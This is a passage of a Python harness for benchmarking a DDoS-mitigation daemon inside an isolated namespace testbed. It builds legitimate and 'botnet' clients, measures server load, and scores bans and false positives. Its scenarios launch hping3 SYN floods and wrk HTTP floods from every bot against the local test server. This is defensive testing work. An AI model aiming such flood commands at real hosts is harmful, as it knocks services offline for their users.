def profile_plan(n, seed, profiles, weights):
    """Network profile for legit_1..legit_n: the same for a given seed in every mode and
    run (review H10: an unseeded draw per run put 0–4 'mobile_bad' clients in a run)."""
    rng = random.Random(seed)
    return [rng.choices(profiles, weights=weights, k=1)[0] for _ in range(n)]


def build_topology():
    """Build the full test topology: bridge + server + legit + botnet."""
    legit_nodes = []     # [(ns_name, ip_addr, profile)]
    botnet_nodes = []    # [(ns_name, ip_addr)]

    # Clean any leftover state from a previous run
    cleanup_all()

    print(f"\n{BOLD}{CYAN}[*] Building network topology...{RESET}")

    create_host_bridge()
    create_server_ns()

    # ── Legitimate clients ──
    print(f"{CYAN}[*] Creating {LEGIT_COUNT} legitimate client namespaces...{RESET}")
    profiles = ["perfect", "broadband", "mobile_3g", "mobile_bad"]
    weights  = [0.30, 0.35, 0.25, 0.10]
    plan = profile_plan(LEGIT_COUNT, PROFILE_SEED, profiles, weights)

    for i in range(1, LEGIT_COUNT + 1):
        ns  = f"legit_{i}"
        ip  = f"{LEGIT_IP_PREFIX}.{i}"
        create_client_ns(ns, ip)
        profile = plan[i - 1]
        apply_tc(ns, profile)
        legit_nodes.append((ns, ip, profile))

    print(f"{GREEN}[+] Legitimate clients ready. Profile distribution "
          f"(PROFILE_SEED={PROFILE_SEED}):{RESET}")
    for p in profiles:
        cnt = sum(1 for _, _, pr in legit_nodes if pr == p)
        print(f"    {p}: {cnt} nodes")

    # ── Botnet ──
    print(f"{CYAN}[*] Creating {BOTNET_COUNT} botnet attacker namespaces...{RESET}")
    for i in range(1, BOTNET_COUNT + 1):
        ns = f"bot_{i}"
        ip = f"{BOTNET_IP_PREFIX}.{i}"
        create_client_ns(ns, ip)
        botnet_nodes.append((ns, ip))

    print(f"{GREEN}[+] Botnet ready: {len(botnet_nodes)} nodes.{RESET}")

    # Invariant: every client/bot interface on the bridge must have a unique MAC.
    macs = {}
    for node in legit_nodes + botnet_nodes:
        ns = node[0]
        res = run(["ip", "-j", "link", "show", "veth_in"], ns=ns)
        mac = json.loads(res.stdout)[0]["address"] if res and res.stdout else None
        assert mac and mac not in macs, f"duplicate/missing MAC {mac} in {ns} (also {macs.get(mac)})"
        macs[mac] = ns
    print(f"{GREEN}[+] {len(macs)} unique client/bot MACs verified.{RESET}")

    # ── Server services ──
    start_server_services()

    return legit_nodes, botnet_nodes


# ═══════════════════════════════════════════════════════════════════════════════
#  LEGITIMATE BACKGROUND TRAFFIC
# ═══════════════════════════════════════════════════════════════════════════════

def _legit_worker(ns_name, ip_addr, profile):
    """Background thread: sends periodic HTTP requests from a legitimate ns."""
    base_interval = {"perfect": 1.5, "broadband": 2.0,
                     "mobile_3g": 3.0, "mobile_bad": 5.0}.get(profile, 2.0)

    while not _legit_traffic_stop.is_set():
        # Tag by the phase at request START, so a request issued under attack counts
        # as 'during' even if it completes just after. Recording is availability-only
        # and never changes this worker's behaviour/cadence.
        period = _avail_period
        scenario = _avail_scenario
        t_start = time.time()
        code, lat = "000", 10.0           # default = no response (curl --max-time)
        try:
            res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{time_total}",
                       "--max-time", "10", HTTP_URL], ns=ns_name, timeout=15)
            if res is not None and res.stdout:
                parts = res.stdout.split()
                if parts:
                    code = parts[0]
                    if len(parts) > 1:
                        lat = float(parts[1])
        except Exception:
            pass
        _avail_record(scenario, period, profile, code, lat, ip=ip_addr, t_start=t_start)
        jitter = random.uniform(-0.5, 1.0)
        _legit_traffic_stop.wait(max(0.5, base_interval + jitter))


def start_legit_traffic(legit_nodes):
    """Start background HTTP traffic from all legitimate client namespaces."""
    _legit_traffic_stop.clear()
    for ns, ip, profile in legit_nodes:
        t = threading.Thread(target=_legit_worker, args=(ns, ip, profile),
                             daemon=True)
        t.start()
        _legit_threads.append(t)
    print(f"[+] Started background traffic from {len(legit_nodes)} legitimate users.")


def stop_legit_traffic():
    """Signal all legitimate traffic threads to stop."""
    _legit_traffic_stop.set()
    for t in _legit_threads:
        t.join(timeout=3)
    _legit_threads.clear()


# ═══════════════════════════════════════════════════════════════════════════════
#  VERIFICATION HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def is_ip_banned(ns_name):
    """Check if an IP is blocked by XDP by pinging the server from its ns."""
    res = run(f"ping -c 2 -W 2 {SERVER_IP}", ns=ns_name, timeout=10)
    if res is None:
        return True
    return res.returncode != 0


def tail_logs_for_bans(target_ips, timeout=25, attack_start=None, log_start_pos=0):
    """Watch the daemon log for [BAN] entries matching any of the target IPs.

    Returns: dict {ip: (engine, ttm)}
    """
    if ATTACK_DURATION > 0:
        timeout = min(timeout, ATTACK_DURATION)   # equal exposure: never wait past the attack's end
    start_time = attack_start or time.time()
    found = {}
    remaining = set(target_ips)

    while time.time() - start_time < timeout and remaining:
        try:
            with open(LOG_FILE, "r") as f:
                f.seek(log_start_pos)
                for line in f:
                    if "[BAN]" not in line:
                        continue
                    for ip in list(remaining):
                        if ip in line:
                            engine = _classify_engine(line)
                            found[ip] = (engine, time.time() - start_time)
                            remaining.discard(ip)
        except FileNotFoundError:
            pass
        if remaining:
            time.sleep(0.5)

    for ip in remaining:
        found[ip] = ("None", None)

    return found


def _classify_engine(line):
    """Classify the detection engine from a [BAN] log line."""
    if "SYN flood" in line:
        return "L4 SYN"
    if "Low-and-slow" in line:
        return "L4 Low-SYN"
    if "Volumetric" in line:
        return "L4 Volumetric"
    if "R.U.D.Y." in line:
        return "L7 R.U.D.Y."
    if "Slow connection" in line:
        return "L4 SlowConn"
    if "Heuristic" in line:
        return "L7 Heuristic"
    if "GRU" in line:
        return "GRU ML"
    return "Unknown"


def _read_softirqs_net_rx():
    """Read /proc/softirqs and return NET_RX counts per CPU as a list."""
    try:
        with open("/proc/softirqs", "r") as f:
            for line in f:
                if line.strip().startswith("NET_RX:"):
                    return [int(x) for x in line.split()[1:]]
    except Exception:
        pass
    return []


def _read_ip_inreceives():
    """Ip InReceives (cumulative) from /proc/net/snmp inside server_ns — packets
    that reached the kernel IP layer. XDP_DROP happens BEFORE this (never
    counted); iptables -j DROP in INPUT happens AFTER (counted), so this isolates
    where each backend drops, which raw PPS/softirq cannot on veth."""
    try:
        res = run(["cat", "/proc/net/snmp"], ns=SERVER_NS)
        if not res or not res.stdout:
            return 0
        hdr = vals = None
        for line in res.stdout.splitlines():
            if line.startswith("Ip:"):
                if hdr is None:
                    hdr = line.split()
                else:
                    vals = line.split()
                    break
        if hdr and vals and "InReceives" in hdr:
            return int(vals[hdr.index("InReceives")])
    except Exception:
        pass
    return 0


def _read_cpu_jiffies():
    """Read /proc/stat -> ((idle_all, total), [(idle_all, total) per cpu0..cpuN]).

    idle_all = idle + iowait; total = sum of all fields. Host-wide, same scope
    as /proc/softirqs, so the hot-core softirq index lines up with per_core.
    """
    agg, per_core = None, []
    try:
        with open("/proc/stat", "r") as f:
            for line in f:
                if not line.startswith("cpu"):
                    break
                parts = line.split()
                vals = [int(x) for x in parts[1:]]
                idle_all = vals[3] + (vals[4] if len(vals) > 4 else 0)
                total = sum(vals)
                if parts[0] == "cpu":
                    agg = (idle_all, total)
                else:                         # cpu0, cpu1, ...
                    per_core.append((idle_all, total))
    except Exception:
        pass
    return agg, per_core


def _cpu_busy_pct(before, after):
    """Busy% between two (idle_all, total) jiffie snapshots."""
    (idle_b, total_b), (idle_a, total_a) = before, after
    d_total, d_idle = total_a - total_b, idle_a - idle_b
    if d_total <= 0:
        return 0.0
    return max(0.0, min(100.0, (1.0 - d_idle / d_total) * 100.0))



def capture_metrics(scenario, phase):
    """Measure one ~1s window SYNCHRONOUSLY, then write the CSV row.

    Runs synchronously on purpose: the caller blocks for the full window, so
    each phase completes before the scenario advances. This keeps 'Phase 1:
    Baseline' (the first call in every scenario) a true pre-attack measurement
    instead of overlapping launch_botnet(), and stops adjacent phases' windows
    from bleeding into one another (also removes the concurrent-CSV-write race).
    """
    # Availability phase transitions, driven by the existing phase labels so each
    # scenario needs no extra edits (reporting-only; see the _avail_* helpers).
    if phase.startswith("Phase 1"):            # Baseline → open the pre-attack 'before' window
        _scenario_begin(scenario)
        _avail_begin(scenario)
        if AVAIL_BEFORE_SECONDS > 0:
            time.sleep(AVAIL_BEFORE_SECONDS)   # denser pre-attack baseline (recorded as 'before')
    elif phase.startswith("Phase 2:"):         # Pre-Mitigation → the attack is now live
        _avail_phase("during")                 # ('Phase 2A' sustained + 'Phase 3' stay 'during')
    elif phase.startswith("Phase 3"):          # equal exposure: first hold the attack to its fixed end
        _hold_attack(_attack["start"])

    def task():
        try:
            # 1. Locate target processes BEFORE the measurement window
            daemon_cpu = 0.0
            daemon_ram = 0.0
            nginx_cpu = 0.0
            daemon_procs = []
            nginx_procs = []
            for p in psutil.process_iter(['name', 'cmdline']):
                try:
                    cmdline = ' '.join(p.info['cmdline'] or [])
                    if "control_plane.py" in cmdline and "ip netns exec" not in cmdline:
                        p.cpu_percent(interval=None)  # prime the baseline
                        daemon_procs.append(p)
                    elif "nginx: worker process" in cmdline:
                        p.cpu_percent(interval=None)  # prime the baseline
                        nginx_procs.append(p)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            def read_stats():
                try:
                    res_p = run(["cat", "/sys/class/net/veth_server/statistics/rx_packets"], ns=SERVER_NS)
                    res_b = run(["cat", "/sys/class/net/veth_server/statistics/rx_bytes"], ns=SERVER_NS)
                    rx_p = int(res_p.stdout.strip())
                    rx_b = int(res_b.stdout.strip())
                    return rx_p, rx_b
                except:
                    return 0, 0

            # 2+3+4. One aligned ~1s window: CPU (per-core + total), softirqs,
            # and PPS are all bracketed by the SAME sleep, so HotCore_CPU_Pct is
            # consistent with CPU_Total (fixes audit 5b). CPU comes from
            # /proc/stat jiffie deltas rather than psutil's two offset windows.
            _, core_before = _read_cpu_jiffies()
            softirq_before = _read_softirqs_net_rx()
            ip_rx1 = _read_ip_inreceives()
            rx_p1, rx_b1 = read_stats()
            time.sleep(1.0)
            rx_p2, rx_b2 = read_stats()
            ip_rx2 = _read_ip_inreceives()
            softirq_after = _read_softirqs_net_rx()
            _, core_after = _read_cpu_jiffies()

            if core_before and core_after and len(core_before) == len(core_after):
                per_core = [_cpu_busy_pct(b, a) for b, a in zip(core_before, core_after)]
            else:
                per_core = []
            # CPU_Total = unweighted MEAN of per-core busy%. The /proc/stat aggregate
            # line jiffie-weights cores, which under-represents a single saturated
            # core on a tickless kernel (a busy core accrues fewer jiffies than an
            # idle one). The mean gives the intuitive "fraction of total CPU in use":
            # one fully-pegged core out of 8 -> 12.5%.
            cpu_total = (sum(per_core) / len(per_core)) if per_core else 0.0

            # 5. Compute NET_RX softirq deltas
            if softirq_before and softirq_after and len(softirq_before) == len(softirq_after):
                softirq_delta = [a - b for a, b in zip(softirq_after, softirq_before)]
                softirq_total = sum(softirq_delta)
                hot_core_id = softirq_delta.index(max(softirq_delta))
                hot_core_softirq = softirq_delta[hot_core_id]
                hot_core_cpu = per_core[hot_core_id] if hot_core_id < len(per_core) else 0.0
            else:
                softirq_total = 0
                hot_core_softirq = 0
                hot_core_id = -1
                hot_core_cpu = 0.0

            # 6. Read per-process CPU (now has a 1s baseline from the prime above)
            for p in daemon_procs:
                try:
                    daemon_cpu += p.cpu_percent(interval=None)
                    daemon_ram += p.memory_info().rss / (1024 * 1024)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            for p in nginx_procs:
                try:
                    nginx_cpu += p.cpu_percent(interval=None)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            mem_total = psutil.virtual_memory().used / (1024 * 1024)
            # 7. TCP State (Server NS)
            tcp_estab = tcp_tw = tcp_syn = 0
            ss_res = run(["ss", "-tan"], ns=SERVER_NS)
            if ss_res and ss_res.stdout:
                tcp_estab = ss_res.stdout.count("ESTAB")
                tcp_tw = ss_res.stdout.count("TIME-WAIT")
                tcp_syn = ss_res.stdout.count("SYN-RECV")

            pps = rx_p2 - rx_p1
            bps = rx_b2 - rx_b1
            # Stack-penetration metrics (fairness: isolate WHERE each backend drops)
            ip_inreceives = max(0, ip_rx2 - ip_rx1)       # packets that reached the IP layer
            prestack_dropped = max(0, pps - ip_inreceives)  # dropped before the stack (XDP)

            # 8. Save to CSV (extended with 4 new kernel metrics columns)
            tag = _mode_tag()
            csv_file = ("/tmp/mitigation_performance.csv" if tag == "performance"
                        else f"/tmp/metrics_{tag}.csv")
            header = ["Timestamp", "Scenario", "Phase", "CPU_Total_Pct",
                      "CPU_Daemon_Pct", "CPU_Nginx_Pct", "RAM_Total_MB",
                      "RAM_Daemon_MB", "TCP_Estab", "TCP_TimeWait",
                      "TCP_SynRecv", "PPS_Rx", "Bps_Rx",
                      "SoftIRQ_NET_RX_Total", "SoftIRQ_NET_RX_HotCore",
                      "HotCore_ID", "HotCore_CPU_Pct",
                      "IP_InReceives", "PreStack_Dropped"]
            row = [
                datetime.datetime.now().isoformat(),
                scenario, phase,
                f"{cpu_total:.1f}", f"{daemon_cpu:.1f}", f"{nginx_cpu:.1f}",
                f"{mem_total:.1f}", f"{daemon_ram:.1f}",
                tcp_estab, tcp_tw, tcp_syn, pps, bps,
                softirq_total, hot_core_softirq,
                hot_core_id, f"{hot_core_cpu:.1f}",
                ip_inreceives, prestack_dropped
            ]
            for path in _out_paths(csv_file, "metrics.csv"):
                _append_csv(path, header, [row])

        except Exception as e:
            print(f"Error capturing metrics: {e}")

    task()   # synchronous: block for the full measurement window (see docstring)

def check_collateral_damage(legit_nodes):
    """Verify that NO legitimate user IP is banned.

    Returns: (ok: bool, banned_list: [(ip, profile)])
    """
    banned_legit = []
    for ns, ip, profile in legit_nodes:
        if is_ip_banned(ns):
            banned_legit.append((ip, profile))
    return (len(banned_legit) == 0), banned_legit


def verify_legit_http(legit_nodes, sample_size=15):
    """Verify HTTP connectivity from a random sample of legitimate users.

    Returns: (success, fail, total)
    """
    sample = random.sample(legit_nodes, min(sample_size, len(legit_nodes)))
    success = fail = 0
    for ns, ip, _ in sample:
        success_for_this = False
        for attempt in range(3):
            res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                       "--max-time", "15", HTTP_URL], ns=ns, timeout=20)
            if res and res.stdout.strip() == "200":
                success_for_this = True
                break
            time.sleep(1)
            
        if success_for_this:
            success += 1
        else:
            fail += 1
    return success, fail, len(sample)


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def _scenario_begin(scenario):
    """Start a scenario's timeline (its pre-attack baseline begins now)."""
    global _daemon_log_label
    _attack.update(t0=time.time(), start=None, end=None)
    _daemon_log_label = scenario


def _attack_begin():
    """Mark (and return) the moment the scenario's attack is launched."""
    _attack["start"] = time.time()
    return _attack["start"]


def attack_hold_remaining(attack_start, duration, now):
    """Seconds left until attack_start + duration; 0 when duration is 0 (historical mode)."""
    if not duration or attack_start is None:
        return 0.0
    return max(0.0, attack_start + duration - now)


def _hold_attack(attack_start):
    """Equal exposure (ATTACK_DURATION > 0): keep the attack running to its fixed end in
    EVERY mode instead of stopping as soon as the bans are seen (review F-02)."""
    left = attack_hold_remaining(attack_start, ATTACK_DURATION, time.time())
    if left > 0:
        print(f"    {CYAN}[*] Equal exposure: attack continues {left:.1f}s more "
              f"(ATTACK_DURATION={ATTACK_DURATION:g}s)...{RESET}")
        time.sleep(left)


def _wrk_seconds():
    """wrk run length: 30 s as before, or long enough to cover ATTACK_DURATION."""
    return max(30, int(ATTACK_DURATION) + 5)


def launch_botnet(botnet_nodes, cmd_func):
    """Launch an attack from every botnet node concurrently.

    cmd_func(ns, ip) → subprocess.Popen or None.
    Returns list of (proc, ns, ip).
    """
    procs = []
    for ns, ip in botnet_nodes:
        p = cmd_func(ns, ip)
        if p:
            procs.append((p, ns, ip))
    return procs


def kill_procs(procs):
    """Kill all attack processes."""
    _attack["end"] = time.time()          # the attack stops now
    for p, ns, _ in procs:
        try:
            p.kill()
            p.wait(timeout=2)
        except Exception:
            pass
        run("pkill -9 -f hping3", ns=ns)
        run("pkill -9 -x wrk", ns=ns)        # exact name, see cleanup_all
        run("pkill -9 -f _dist_", ns=ns)
        if FLOOD_TOOL != "wrk":
            run("pkill -9 -f bench/loadgen.py", ns=ns)
            run("pkill -9 -x k6", ns=ns)


# ── HTTP-flood load model (scenario 4): wrk as ever, or a verified open-loop generator ─────

def _loadtools():
    """bench/loadtools.py, imported only when an open-loop flood is asked for: a default run
    never loads it."""
    path = os.path.join(PROJECT_DIR, "bench")
    if path not in sys.path:
        sys.path.insert(0, path)
    import loadtools
    return loadtools


def flood_preflight(tool=None, manifest=None, root=None):
    """None when the HTTP flood can run as configured, else why not. wrk needs nothing; an open-loop
    tool must be `verified` in bench/loadtools.json with the sha256 pinned there, the target must
    pass the scope lock of bench/loadtools.py, and prlimit must exist."""
    tool = tool or FLOOD_TOOL
    if tool == "wrk":
        return None
    lt = _loadtools()
    try:
        lt.resolve_tool(manifest or lt.load_manifest(), tool, root)
        lt.check_scope(HTTP_URL)
    except (lt.ToolError, lt.ScopeError, OSError, ValueError) as exc:
        return f"FLOOD_TOOL={tool}: {exc}"
    if shutil.which("prlimit") is None:
        return f"FLOOD_TOOL={tool} needs prlimit (util-linux) to raise the open-file limit"
    return None


def flood_argv(ns, tool=None, rate=None, manifest=None, root=None):
    """The command of one bot's open-loop generator, for run() to prefix with `ip netns exec <ns>`
    and `taskset`: the loadtools command for the tool at the settings the verification used
    (loadtools.limits_for), for as long as wrk would run, with the open-file limit raised for the
    generator alone. The binary's hash was checked by flood_preflight; here only the status is."""
    tool, rate = tool or FLOOD_TOOL, FLOOD_RATE if rate is None else rate
    lt = _loadtools()
    lim = lt.limits_for(tool, rate)
    spec = lt.LoadSpec(url=HTTP_URL, rate=rate, duration=_wrk_seconds(), method="GET", timeout=10.0,
                       connections=lim["connections"], workers=lim["workers"],
                       max_workers=lim["max_workers"], name="http-flood")
    workdir = (os.path.join(_results_dir, "attackers", ns) if _results_dir
               else os.path.join("/tmp", f"_dist_flood_{ns}"))
    plan = lt.build_plan(tool, spec, workdir, manifest, root, check=False)
    lt.write_inputs(plan)
    return ["prlimit", f"--nofile={FLOOD_NOFILE}", "--", *plan.steps[0].argv]


def start_flood(ns, ip):
    """One bot's HTTP flood. For wrk this is exactly the historical command."""
    if FLOOD_TOOL == "wrk":
        return run(f"wrk -t{WRK_THREADS} -c{WRK_CONNS} -d{_wrk_seconds()}s {HTTP_URL}",
                   ns=ns, bg=True)
    return run(flood_argv(ns), ns=ns, bg=True)


def flood_alive(procs, bots, wait=None):
    """Open-loop only: raise unless every bot's generator is still running `wait` seconds after
    launch. A generator that never started would read as "the attack does no harm"."""
    if FLOOD_TOOL == "wrk":
        return
    time.sleep(FLOOD_LAUNCH_CHECK_S if wait is None else wait)
    dead = [ns for p, ns, _ in procs if p.poll() is not None]
    if dead or len(procs) != bots:
        kill_procs(procs)
        raise RuntimeError(f"the {FLOOD_TOOL} flood did not start on all {bots} bots "
                           f"(exited: {dead or 'none'}; launched: {len(procs)})")


def _write_script(path, content):
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, 0o755)


# ═══════════════════════════════════════════════════════════════════════════════
#  REPORT
# ═══════════════════════════════════════════════════════════════════════════════

# Data_Scenario is the name used in the metrics/availability CSVs, which differs from the
# report name for two scenarios ("Distributed IP Fragmentation Flood" vs "Distributed
# Fragmentation", "Multi-Vector Distributed Attack" vs "Multi-Vector Attack").
SCENARIO_RESULT_FIELDS = [
    "Scenario", "Data_Scenario", "Mode", "Operating_Point", "Profile_Seed", "Attack_Duration_s",
    "Scenario_T0", "Attack_Start", "Attack_End", "Exposure_s", "Bots",
    "Banned_Harness", "Banned_Events", "TTM_Harness_Mean_s", "TTM_Exact_Median_s",
    "TTM_Exact_Max_s", "TTM_Exact_By_Bot", "Engine_By_Bot", "FP_Source", "FP_IPs",
    "FP_Ping_IPs", "Legit_HTTP_OK", "Legit_HTTP_Total", "Result"]


def _fmt_t(x):
    return "" if x is None else f"{x:.3f}"


def _scenario_events(bot_ips, legit_ips):
    """Ground truth for the current scenario from the daemon's ban events: exact
    time-to-mitigate and engine per bot (bans while the attack ran) and the legit IPs
    banned since the scenario began. available=False when this run has no event log."""
    out = {"available": False, "ttm": {}, "engine": {}, "fp": set()}
    if not _results_dir:
        return out
    events = ban_events.read_events(os.path.join(_results_dir, "ban_events.jsonl"))
    if not any(e["kind"] == "start" for e in events):
        return out
    out["available"] = True
    start, end = _attack["start"], _attack["end"] or time.time()
    if start is not None:
        for ip, e in ban_events.first_bans(events, ips=bot_ips, since=start, until=end).items():
            out["ttm"][ip] = e["t_wall"] - start
            out["engine"][ip] = e.get("engine", "unknown")
    out["fp"] = set(ban_events.first_bans(events, ips=legit_ips, since=_attack["t0"]))
    return out


def _write_scenario_result(rec):
    """One machine-readable row per scenario in <results_dir>/scenario_results.csv."""
    if _results_dir:
        _append_csv(os.path.join(_results_dir, "scenario_results.csv"), SCENARIO_RESULT_FIELDS,
                    [[rec.get(k, "") for k in SCENARIO_RESULT_FIELDS]])


NGINX_ACCESS_LOG = "/var/log/nginx/ddos_ml_access.log"
SERVER_REQUESTS_FIELDS = ["Data_Scenario", "Mode", "T_Epoch_s", "T_Rel_s", "Client_Class", "Status",
                          "Requests", "Request_Time_Mean_s", "Request_Time_Max_s"]


def _client_class(ip):
    """bot | legit | other, by the testbed's address plan."""
    if ip.startswith(BOTNET_IP_PREFIX + "."):
        return "bot"
    return "legit" if ip.startswith(LEGIT_IP_PREFIX + ".") else "other"


def aggregate_access_log(lines, attack_start=None):
    """(rows, unparsable lines) from the lines of the Nginx JSON access log (nginx.conf,
    json_ml_format): per second, client class and status, how many requests the server got and
    their mean and largest request time. T_Rel_s counts from the second of attack_start (blank
    without one).

    Nginx writes a line when a request ends, in a timestamp of whole seconds (truncated), and
    request_time is how long it took. A request is therefore binned by the second it ARRIVED:
    the log second plus half a second (the mean of the truncated part) minus request_time, so the
    estimate is within half a second, and a request that waited 8 s in an overloaded server counts
    where the generator sent it, not where the server finished with it."""
    seconds, cells, bad = {}, {}, 0
    for line in lines:
        try:
            rec = json.loads(line)
            stamp = rec["timestamp"]
            if stamp not in seconds:
                seconds[stamp] = int(datetime.datetime.fromisoformat(stamp).timestamp())
            took = float(rec["request_time"])
            key = (math.floor(seconds[stamp] + 0.5 - took), _client_class(rec["client_ip"]),
                   int(rec["status"]))
        except (ValueError, KeyError, TypeError, AttributeError, OverflowError):
            bad += 1
            continue
        cell = cells.setdefault(key, [0, 0.0, 0.0])
        cell[0] += 1
        cell[1] += took
        cell[2] = max(cell[2], took)
    t0 = None if attack_start is None else int(attack_start)
    rows = [[sec, "" if t0 is None else sec - t0, cls, status, n, round(total / n, 6), round(top, 6)]
            for (sec, cls, status), (n, total, top) in sorted(cells.items())]
    return rows, bad


def _archive_server_requests(scenario):
    """Aggregate this scenario's Nginx access log into <results_dir>/server_requests.csv, before the
    next reset truncates it. It is the load as the server received it, in every mode and under every
    load model, which a generator that is killed at the end cannot report. Never stops the run."""
    if not _results_dir:
        return
    try:
        with open(NGINX_ACCESS_LOG, encoding="utf-8", errors="replace") as fh:
            rows, bad = aggregate_access_log(fh, _attack["start"])
    except OSError as exc:
        print(f"  {YELLOW}[!] server_requests.csv: the access log is unreadable ({exc}){RESET}")
        return
    mode = _mode_label()
    _append_csv(os.path.join(_results_dir, "server_requests.csv"), SERVER_REQUESTS_FIELDS,
                [[scenario, mode, *row] for row in rows])
    if bad:
        print(f"  {YELLOW}[!] server_requests.csv: {bad} access-log lines could not be read{RESET}")


def report(name, ban_results, botnet_nodes, legit_nodes):
    """Evaluate and display results for a distributed attack scenario."""
    _avail_finalize()   # aggregate availability FIRST (bounds 'after' to the post-kill window,
                        # before the collateral/HTTP verification curls run below)
    botnet_ips = [ip for _, ip in botnet_nodes]
    banned_cnt = sum(1 for ip in botnet_ips if ban_results[ip][0] != "None")
    total = len(botnet_ips)

    ttm_vals = [ban_results[ip][1] for ip in botnet_ips
                if ban_results[ip][1] is not None]
    avg_ttm = sum(ttm_vals) / len(ttm_vals) if ttm_vals else None

    engines = set(ban_results[ip][0] for ip in botnet_ips
                  if ban_results[ip][0] != "None")

    # False positives come from the daemon's ban events (ground truth, review F-25). The
    # old ping check still runs and is recorded for comparison; it decides only when a
    # daemon ran without an event log.
    _, col_list_ping = check_collateral_damage(legit_nodes)
    ev = _scenario_events(botnet_ips, [ip for _, ip, _ in legit_nodes])
    if os.environ.get("MITIGATION_MODE") == "none":
        col_list, fp_source = [], "no daemon"            # nothing can ban a client
    elif ev["available"]:
        profile_of = {ip: prof for _, ip, prof in legit_nodes}
        col_list, fp_source = [(ip, profile_of[ip]) for ip in sorted(ev["fp"])], "ban events"
    else:
        col_list, fp_source = col_list_ping, "ping"
    col_ok = not col_list
    ttms = sorted(ev["ttm"].values())
    http_ok, http_fail, http_total = verify_legit_http(legit_nodes)

    eff_pass  = banned_cnt >= total * 0.8
    col_pass  = col_ok
    http_pass = http_fail == 0
    overall   = eff_pass and col_pass and http_pass

    tag = f"{GREEN}PASS{RESET}" if overall else f"{RED}FAIL{RESET}"

    print(f"\n  [{tag}] {BOLD}{name}{RESET}")
    print(f"  ├── Botnet banned:     {banned_cnt}/{total} "
          f"({'✅' if eff_pass else '❌'})")
    if avg_ttm is not None:
        print(f"  ├── Avg TTM:           {avg_ttm:.2f}s")
    else:
        print(f"  ├── Avg TTM:           N/A")
    if ev["available"]:
        if ttms:
            print(f"  ├── Exact TTM:         median {statistics.median(ttms):.2f}s · "
                  f"max {ttms[-1]:.2f}s ({len(ttms)}/{total} bots, ban events)")
        else:
            print("  ├── Exact TTM:         no bot banned (ban events)")
    print(f"  ├── Engines:           {', '.join(engines) if engines else 'None'}")
    print(f"  ├── Legit HTTP:        {http_ok}/{http_total} OK "
          f"({'✅' if http_pass else '❌'})")
    if _avail_results:                       # continuous service-availability (reporting-only)
        print(_avail_results[-1]["line"])
    fp_str = "None ✅" if col_pass else f"{len(col_list)} BANNED ❌"
    print(f"  └── False Positives:   {fp_str} [{fp_source}]")
    if col_list:
        for lip, lprof in col_list:
            print(f"       └── FP: {lip} (profile: {lprof})")

    results.append({
        "scenario": name,
        "banned": f"{banned_cnt}/{total}",
        "avg_ttm": f"{avg_ttm:.2f}s" if avg_ttm else "N/A",
        "engines": ", ".join(engines) if engines else "None",
        "fp": "Clean" if col_pass else f"{len(col_list)} FP",
        "result": "PASS" if overall else "FAIL",
    })

    exposure = (_attack["end"] - _attack["start"]) if (_attack["start"] and _attack["end"]) else None
    if ATTACK_DURATION > 0 and exposure is not None and exposure > ATTACK_DURATION + 2.0:
        print(f"  {YELLOW}[!] The attack ran {exposure:.1f}s, longer than ATTACK_DURATION="
              f"{ATTACK_DURATION:g}s (this scenario's fixed phases take longer), so exposure "
              f"is NOT equal across modes; raise ATTACK_DURATION.{RESET}")
    _write_scenario_result({
        "Scenario": name, "Data_Scenario": _avail_scenario, "Mode": _mode_label(),
        "Operating_Point": OPERATING_POINT,
        "Profile_Seed": PROFILE_SEED, "Attack_Duration_s": ATTACK_DURATION,
        "Scenario_T0": _fmt_t(_attack["t0"]), "Attack_Start": _fmt_t(_attack["start"]),
        "Attack_End": _fmt_t(_attack["end"]), "Exposure_s": _fmt_t(exposure),
        "Bots": total, "Banned_Harness": banned_cnt,
        "Banned_Events": len(ttms) if ev["available"] else "",
        "TTM_Harness_Mean_s": _fmt_t(avg_ttm),
        "TTM_Exact_Median_s": _fmt_t(statistics.median(ttms)) if ttms else "",
        "TTM_Exact_Max_s": _fmt_t(ttms[-1]) if ttms else "",
        "TTM_Exact_By_Bot": json.dumps({ip: round(t, 3) for ip, t in sorted(ev["ttm"].items())}),
        "Engine_By_Bot": json.dumps(dict(sorted(ev["engine"].items()))),
        "FP_Source": fp_source,
        "FP_IPs": json.dumps([ip for ip, _ in col_list]),
        "FP_Ping_IPs": json.dumps([ip for ip, _ in col_list_ping]),
        "Legit_HTTP_OK": http_ok, "Legit_HTTP_Total": http_total,
        "Result": "PASS" if overall else "FAIL",
    })
    _archive_server_requests(_avail_scenario)


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK SCENARIOS
# ═══════════════════════════════════════════════════════════════════════════════

def scenario_syn_flood(botnet, legit):
    """S1: Distributed high-rate SYN flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 1: Distributed SYN Flood (1000 SYN/s per bot)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed SYN Flood", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed SYN Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed SYN Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed SYN Flood", bans, botnet, legit)


def scenario_slow_syn(botnet, legit):
    """S2: Distributed low-and-slow SYN flood (10 SYN/s — GRU ML target)."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 2: Distributed Low & Slow SYN (GRU ML Target)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Low & Slow SYN", "Phase 1: Baseline")
    attack_start = _attack_begin()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -i u100000 {SERVER_IP}", ns=ns, bg=True))
